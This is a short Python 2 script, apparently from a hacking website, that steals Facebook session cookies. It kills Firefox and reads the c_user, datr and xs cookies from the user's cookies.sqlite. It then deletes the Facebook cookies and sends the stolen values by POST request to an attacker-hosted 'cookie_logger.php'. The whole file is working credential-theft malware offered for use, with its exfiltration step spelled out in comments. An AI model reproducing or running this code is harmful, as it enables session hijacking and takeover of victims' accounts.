#20th Jan,2015
#author:Rashid feroz[rashid.2008feroz@gmail.com]
#website:Hackwhiz.com

import os
import sqlite3
import urllib
import urllib2
import fnmatch

#kill firefox

def kill_firefox():
    os.system("pkill firefox")
    
kill_firefox()


#get cookie DB pathname
s1=os.getenv("HOME")
s2="/.mozilla/firefox"

dir=os.listdir(s1+s2)
for d in dir:
    if fnmatch.fnmatch(d, '*.default'):   
        path = s1+s2+'/'+d+"/cookies.sqlite"


#Extract Cookie details from DB
c_user=datr=xs="None"
sqlite_file = path
conn = sqlite3.connect(sqlite_file)
c = conn.cursor()

c.execute("select count(*) from moz_cookies where baseDomain='facebook.com' and name='c_user'")

for data in c.fetchall():
    count=data[0]

if(count == 1):
    
    c.execute("select value from moz_cookies where baseDomain='facebook.com' and name='c_user'")

    for data in c.fetchall():
        c_user=data[0]

    c.execute("select value from moz_cookies where baseDomain='facebook.com' and name='datr'")

    for data in c.fetchall():
        datr=data[0]

    c.execute("select value from moz_cookies where baseDomain='facebook.com' and name='xs'")

    for data in c.fetchall():
        xs=data[0]


    #Delete facebook cookies from DB
    c.execute("delete from moz_cookies where baseDomain='facebook.com'")

conn.commit()

conn.close()

xs=str(xs)

#sending the cookie data to the attacker using POST request
#edit the url and place your website name where you have hosted your cookie_logger.php script
url = 'http://your-website/cookie_logger.php'
payload = {'c_user': c_user, 'datr': datr,'xs': xs}


if (xs != "None"):
    data = urllib.urlencode(payload)
    req = urllib2.Request(url, data)
    response = urllib2.urlopen(req)
    print "success"
